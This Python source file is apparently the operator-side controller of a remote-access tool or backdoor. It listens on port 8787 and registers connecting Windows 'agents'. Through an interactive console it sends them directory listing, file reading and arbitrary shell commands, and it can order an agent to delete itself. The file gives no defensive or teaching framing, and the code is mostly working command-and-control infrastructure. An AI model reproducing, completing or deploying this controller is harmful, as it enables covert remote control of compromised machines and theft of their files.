import cmd, socket, threading, zlib, select, time, colorama, os, json

WIN_COMMANDS = {'ls' : 0, 'cd' : 1, 'exit' : 2, 'cat' : 3, 'pwd' : 4, 'shell' : 5}
SYSTEM_COMMAND = {'Windows': json.dumps(WIN_COMMANDS)}
TIMEOUT = 10


class Agent(cmd.Cmd):
    def __init__(self, socket: socket.socket, server: 'Server', completekey: str = "tab", stdin = None, stdout = None) -> None:
        super().__init__(completekey, stdin, stdout)
        self.socket = socket
        self.remote_addr = socket.getpeername()
        self.server = server
        self.prompt = f'{colorama.Fore.BLUE}{self.remote_addr} >{colorama.Style.RESET_ALL}'

    def do_ls(self, args):
        '''list directory contents'''
        self.socket.sendall('ls {}'.format(args).encode())
        result = read(self.socket)
        print(result)

    def do_cd(self, args: str):
        '''change directory'''
        args = args.strip()
        if not args:
            print('no argument')
            return
        self.socket.sendall('cd {}'.format(args).encode())
        result = read(self.socket)
        print(result)

    def do_delete(self, args):
        '''delete current agent & return'''
        self.server.delete_client(self.socket.getpeername())
        return True

    def do_exit(self, args):
        return True

    def do_cat(self, args: str):
        args = args.strip()
        if not args:
            print('no argument')
            return
        self.socket.sendall('cat {}'.format(args).encode())
        result = read(self.socket)
        print(result)

    def do_pwd(self, args):
        '''print current directory'''
        self.socket.sendall(b'pwd')
        result = read(self.socket)
        print(result)

    def do_shell(self, args: str):
        '''run command'''
        args = args.strip()
        if not args:
            print('no argument')
            return
        self.socket.sendall('shell {}'.format(args).encode())
        result = read(self.socket)
        print(result)

    def do_clear(self, args):
        '''clear screen'''
        os.system('cls' if os.name == 'nt' else 'clear')

    def emptyline(self):
        return


class Server(cmd.Cmd):
    def __init__(self, completekey: str = "tab", stdin = None, stdout = None) -> None:
        super().__init__(completekey, stdin, stdout)
        self.timeout = 10
        self.prompt = colorama.Fore.GREEN + '(cli)' + colorama.Style.RESET_ALL
        self.threads: list[threading.Thread] = []
        self.clients:dict[socket._RetAddress, socket.socket] = {}
        self.server = socket.socket()
        self.server.bind(('', 8787))
        self.server.listen()
        self.running = True
        self.server_thread = threading.Thread(name='server listen thread', target=self.accept_client, daemon=True)
        self.server_thread.start()

    def do_use(self, args: str):
        ''''''
        if not args:
            print('no argument')
            return
        if not args.isdigit() or int(args) not in range(len(self.clients)):
            print('error argument')
            return
        index = int(args.strip())
        self.current = Agent(list(self.clients.values())[index], self)
        self.current.cmdloop()

    def do_listen(self, args: str):
        '''listen'''
        print(args)

    def do_delete(self, args: str):
        ''''''
        if not args:
            print('no argument')
            return
        if not args.isdigit() or int(args) not in range(len(self.clients)):
            print('error argument')
            return
        index = int(args.strip())
        addr = list(self.clients.keys())[index]
        self.delete_client(addr)
        print('delete done')

    def do_exit(self, args):
        '''exit'''
        self.running = False
        return True

    def do_quit(self, args):
        '''same as exit'''
        self.do_exit(args)

    def do_list(self, args):
        '''show all clients'''
        for i, addr in enumerate(self.clients):
            print(i, addr)

    def do_clear(self, args):
        '''clear screen'''
        os.system('cls' if os.name == 'nt' else 'clear')

    def start_listen(self):
        pass

    def accept_client(self):
        while self.running:
            conn, addr = self.server.accept()
            system = conn.recv(1024).decode()
            conn.send(zlib.compress(SYSTEM_COMMAND[system].encode()))
            self.clients[addr] = conn
            print('[+] new client')

    def delete_client(self, addr: 'socket._RetAddress'):
        self.clients[addr].sendall(b'delete')
        self.clients[addr].close()
        self.clients.pop(addr)

    def emptyline(self):
        return

def read(s: 'socket.socket', bufsize=4096):
    result = b''
    while True:
        part = s.recv(bufsize)
        result += part
        ready, _, _ = select.select([s], [], [], 0)
        if not ready:
            break
    return result.decode()

if __name__ == '__main__':
    colorama.init()
    s = Server()
    s.cmdloop()